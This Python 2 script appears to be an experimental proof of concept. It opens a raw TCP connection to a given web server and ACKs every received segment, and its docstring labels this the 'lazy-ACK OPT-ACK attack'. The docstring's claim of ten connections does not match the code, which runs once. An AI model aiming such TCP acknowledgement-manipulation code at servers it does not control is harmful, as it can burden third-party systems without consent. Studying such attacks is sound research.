import sys
import time
from raw_packet import Connection

if len(sys.argv) < 2:
    print "Usage : connect dest_ip "
    sys.exit()

"""We will try to establish a connection to a remote web server
and ACK all the packets that we receive. This will actually
implement the lazy-ACK OPT-ACK attack, but it shouldn't disrupt
any network, normally (I hope so at least)...

Let's go ! In detail, this script :
 - Opens a raw socket connected to sys.argv[1] on port 80
 - For ten times, does:
   - Establishes a TCP connection to the remote server
   - ACKs all the received segments
   - Closes the connection gracefully (FIN+ACK and RST)
"""

c = Connection(sys.argv[1], 80)


next_seq = c.initiate_connection()
start = time.time()
first_seq = -1
print "time, acked"
while True:
    try:
        (seq, length) = c.read_packet()
    except Connection.Closed:
        break
    if first_seq < 0:
        first_seq = seq
    # cont is True if we just ACKed a FIN packet on this connection
    cont = c.send_raw(seq_nbr = next_seq, ack_nbr=seq+length)
    now = time.time()
    print("%f, %d" % (now-start,(seq+length - first_seq)))
    if not cont:
        c.tear_down(next_seq)
        break